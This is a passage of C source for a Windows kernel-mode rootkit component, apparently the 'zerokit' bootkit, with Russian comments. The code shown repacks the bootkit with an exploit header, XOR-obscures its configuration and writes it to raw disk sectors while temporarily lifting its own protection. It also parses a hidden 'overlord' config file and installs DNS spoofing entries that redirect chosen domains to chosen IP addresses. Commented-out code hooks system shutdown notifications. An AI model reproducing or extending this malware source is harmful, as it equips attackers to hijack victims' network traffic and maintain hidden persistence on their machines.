                                uint8_t* ptr;
                                uint8_t* pConf;

                                // Сигнал для завершения работы зерокита.
                                pGlobalBlock->shutdownToken = SHUTDOWN_FOR_RELOAD;

                                pGlobalBlock->packSize = pPackFileHeader->fileSize;
                                pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &pGlobalBlock->pZerokitPack, sizeof(exploit_startup_header_t) + pPackFileHeader->fileSize + sizeof(configuration_t), NonPagedPool);
                                pGlobalBlock->pCommonBlock->fnmemcpy(pGlobalBlock->pZerokitPack + sizeof(exploit_startup_header_t), (uint8_t*)pPackFileHeader + sizeof(bundle_file_header_t), pPackFileHeader->fileSize);
                                pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(bundleBuffer, LOADER_TAG);

                                // Добавляем конфигурационную область и фиксим заголовок зерокита.
                                pZerokitHeader = (pzerokit_header_t)(pGlobalBlock->pZerokitPack + sizeof(exploit_startup_header_t) + 1024 + 2);
                                pZerokitHeader->sizeOfConfig = sizeof(configuration_t);
                                pZerokitHeader->sizeOfPack += sizeof(configuration_t);
#ifdef _WIN64
                                pModsPackHdr = (pmods_pack_header_t)(pGlobalBlock->pZerokitPack + sizeof(exploit_startup_header_t) + pZerokitHeader->sizeOfBootkit);
                                pGlobalBlock->pModHdr = (pmod_header_t)((uint8_t*)pModsPackHdr + (sizeof(mods_pack_header_t) << 1) + pModsPackHdr->sizeOfPack);
                                // Смещение от начала заголовка первого блока до начала конфигурационной области.
                                pGlobalBlock->pModHdr->confOffset = ((pmods_pack_header_t)((uint8_t*)pGlobalBlock->pModHdr - sizeof(mods_pack_header_t)))->sizeOfPack;
#else
                                pGlobalBlock->pModHdr = (pmod_header_t)(pGlobalBlock->pZerokitPack + sizeof(exploit_startup_header_t) + pZerokitHeader->sizeOfBootkit + sizeof(mods_pack_header_t));
                                // Смещение от начала заголовка первого блока до начала конфигурационной области.
                                pGlobalBlock->pModHdr->confOffset = pZerokitHeader->sizeOfPack - pZerokitHeader->sizeOfBootkit - pZerokitHeader->sizeOfBundle - pZerokitHeader->sizeOfConfig - sizeof(mods_pack_header_t);
#endif // _WIN64
                                pConf = pGlobalBlock->pZerokitPack + sizeof(exploit_startup_header_t) + pPackFileHeader->fileSize;
                                pGlobalBlock->pCommonBlock->fnmemcpy(pConf, pGlobalBlock->pCommonBlock->pConfig, sizeof(configuration_t));

                                // Шифруем конфиг.
                                ptr = pConf + sizeof(pGlobalBlock->pCommonBlock->pConfig->block_header);
                                for (i = 0; i < sizeof(configuration_t) - sizeof(pGlobalBlock->pCommonBlock->pConfig->block_header); ++i, ++ptr) {
                                    *ptr ^= pConf[i % sizeof(pGlobalBlock->pCommonBlock->pConfig->block_header)]; 
                                }

                                __movsb(pBundleEntry->sha1, sha1Hash, 20);

                                break;
                            }
                            else if (pGlobalBlock->pLauncherBlock->fnlauncher_process_bundle((pbundle_header_t)bundleBuffer, sha1Hash, TRUE)) {
                                __movsb(pBundleEntry->sha1, sha1Hash, 20);
                            }
                            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(bundleBuffer, LOADER_TAG);
                        }

                        if (httpResponse != NULL) {
                            pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(httpResponse, LOADER_TAG);
                        }
                    }
                }
            }
        }
    }

    if (needSave) {
        pGlobalBlock->pTasksBlock->fntasks_save_bundle_entries(pHeadBundleEntry, count);
    }

    return knockResult;
}

NTSTATUS logic_save_config()
{
    NTSTATUS ntStatus;
    pdisk_info_t pDiskInfo;
    uint8_t* buffer;
    uint8_t* ptr;
    uint32_t i, alignedSize;
    USE_GLOBAL_BLOCK

    pDiskInfo = pGlobalBlock->pCommonBlock->pBootDiskInfo;

    if (pDiskInfo == NULL) {
        return STATUS_UNSUCCESSFUL;
    }

    alignedSize = pGlobalBlock->pCommonBlock->zerokitHeader.sizeOfConfig;

    if (alignedSize != _ALIGN(sizeof(configuration_t), pDiskInfo->bytesPerSector)) {
        return STATUS_INVALID_BUFFER_SIZE;
    }

    // Выделяем буфер для копирования конфига.
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &buffer, alignedSize, NonPagedPool);
    __movsb(buffer, (uint8_t*)pGlobalBlock->pCommonBlock->pConfig, sizeof(configuration_t));

    ptr = buffer + sizeof(pGlobalBlock->pCommonBlock->pConfig->block_header);
    for (i = 0; i < sizeof(configuration_t) - sizeof(pGlobalBlock->pCommonBlock->pConfig->block_header); ++i, ++ptr) {
        *ptr ^= buffer[i % sizeof(pGlobalBlock->pCommonBlock->pConfig->block_header)]; 
    }

    // Снимаем временно защиту с конфигурационной области.
    pGlobalBlock->pProtectorBlock->hConfRegion->needProtect = FALSE;

    // Записываем конфигурацию на диск.
    ntStatus = pGlobalBlock->pCommonBlock->fncommon_dio_write_sector(pDiskInfo, buffer, alignedSize, pGlobalBlock->pCommonBlock->bodySecOffset + pGlobalBlock->pCommonBlock->zerokitHeader.sizeOfPack);

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(buffer, LOADER_TAG);

    pGlobalBlock->pProtectorBlock->hConfRegion->needProtect = TRUE;

    return ntStatus;
}

void logic_handle_key(const char* key, char* val)
{
#define DNS_SPOOFER_LIST_KEY_HASH 0x0E61B8A5
    USE_GLOBAL_BLOCK

    if (pGlobalBlock->pCommonBlock->fncommon_calc_hash((uint8_t*)key, 0) == DNS_SPOOFER_LIST_KEY_HASH) {
        const char* end = val + pGlobalBlock->pCommonBlock->fncommon_strlen_s(val, NTSTRSAFE_MAX_LENGTH);

        pGlobalBlock->pTcpipBlock->fntcpip_remove_all_dnss_entries();

        for ( ; val < end; ) {
            uint32_t ipAddr;
            char* sUrl = val;
            char* sIp;
            for ( ; val < end && *val != ':'; ++val);
            if (*val != ':') {
                break;
            }
            *(val++) = '\0';
            for (sIp = val; val < end && *val != ';'; ++val);
            if (*val != ';') {
                break;
            }
            *(val++) = '\0';

            ipAddr = NTOHL(pGlobalBlock->pTcpipBlock->fnipaddr_addr((const char*)sIp));
            pGlobalBlock->pTcpipBlock->fntcpip_add_or_modify_dnss_entry(sUrl, ipAddr);
        }
    }
}

void logic_reload_overlord_config()
{
    char *buffer, *ptr, *end;
    char *key, *val;
    int err;
    uint32_t readed;
    LARGE_INTEGER delay;
    uint32_t replies;
    pzfs_file_t pFile;
    USE_GLOBAL_BLOCK

    replies = 0;
    delay.QuadPart = -110000000I64;  // 11 секунд.
    // Пытаемся открыть конфигурационный файл максимум 7 раз.
    do {
        err = pGlobalBlock->pFsBlock->fnzfs_open(pGlobalBlock->pFsBlock->pZfsIo, &pFile, pGlobalBlock->pLogicBlock->overlordConfPath, ZFS_MODE_READ, 0);
        if (err == ERR_OK) {
            break;
        }
        pGlobalBlock->pCommonBlock->fnKeDelayExecutionThread(KernelMode, FALSE, &delay);
    } while (err != ERR_OK && ++replies < 3);

    if (err == ERR_OK) {
        // Читаем конфиг.
        pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &buffer, pFile->filesize + 1, NonPagedPool);
        if (pGlobalBlock->pFsBlock->fnzfs_read(pFile, buffer, pFile->filesize, &readed) == ERR_OK && pFile->filesize == readed) { // Конфиг успешно открыт.
            ptr = buffer;
            end = ptr + pFile->filesize;

            for ( ; ptr < end; ++ptr) {
                for ( ; ptr < end && (*ptr == ' ' || *ptr == '\t' || *ptr =='\r' || *ptr == '\n'); ++ptr);
                if (ptr >= end) {
                    continue;
                }
                key = ptr;
                for ( ; ptr < end && *ptr != ' ' && *ptr != '\t' && *ptr != '\r' && *ptr != '\n' && *ptr != '='; ++ptr);
                *(ptr++) = '\0';
                if (*ptr != '=') {
                    for ( ; ptr < end && *ptr != '='; ++ptr);
                    if (*ptr != '=') {
                        break;
                    }
                }
                for (++ptr; ptr < end && (*ptr == ' ' || *ptr == '\t' || *ptr =='\r' || *ptr == '\n'); ++ptr);
                if (ptr >= end) {
                    continue;
                }
                val = ptr;
                for ( ; ptr < end && *ptr != ' ' && *ptr != '\t' && *ptr != '\r' && *ptr != '\n'; ++ptr);
                *(ptr++) = '\0';
                pGlobalBlock->pLogicBlock->fnlogic_handle_key(key, val);
            }
        }

        pGlobalBlock->pFsBlock->fnzfs_close(pFile);
        pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(buffer, LOADER_TAG);
    }
}

// LIST_ENTRY* IopInterlockedInsertTailList(LIST_ENTRY *a1, LIST_ENTRY *a2)
// {
//     LIST_ENTRY *v2; // esi@1
//     LIST_ENTRY *v3; // edi@1
//     KIRQL v4; // al@1
//     LIST_ENTRY *v6; // edx@1
//     LIST_ENTRY *v7; // ebx@1
//     USE_GLOBAL_BLOCK
// 
//     v2 = a2;
//     v3 = a1;
//     v4 = pGlobalBlock->pCommonBlock->fnKfRaiseIrql(DISPATCH_LEVEL);
//     v6 = v3->Blink;
//     v7 = v3->Blink;
//     if ( v7 == v3 ) {
//         v7 = 0;
//     }
//     v2->Flink = v3;
//     v2->Blink = v6;
//     v6->Flink = v2;
//     v3->Blink = v2;
//     pGlobalBlock->pCommonBlock->fnKfLowerIrql(v4);
//     return v7;
// }
// 
// NTSTATUS MyIoRegisterLastChanceShutdownNotification(PDEVICE_OBJECT DeviceObject)
// {
//     uintptr_t* v1;
//     NTSTATUS result;
//     USE_GLOBAL_BLOCK
// 
//     v1 = pGlobalBlock->pCommonBlock->fnExAllocatePoolWithTag(NonPagedPool, sizeof(LIST_ENTRY) + sizeof(uintptr_t), LOADER_TAG);
//     if (v1) {
//         pGlobalBlock->pCommonBlock->fnObfReferenceObject(DeviceObject);
//         *(v1 + 2) = (uintptr_t)DeviceObject;
//         pGlobalBlock->pLogicBlock->fnIopInterlockedInsertTailList(pGlobalBlock->pLogicBlock->pIopNotifyLastChanceShutdownQueueHead, (PLIST_ENTRY)v1);
//         DeviceObject->Flags |= 8;
//         result = 0;
//     }
//     else {
//         result = 0xC000009A;
//     }
//     return result;
// }

// NTSTATUS logic_system_shutdown_notifier(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
// {
//     NTSTATUS ntStatus = STATUS_SUCCESS;
// 
// 
// 
//     return ntStatus;
// }
// 
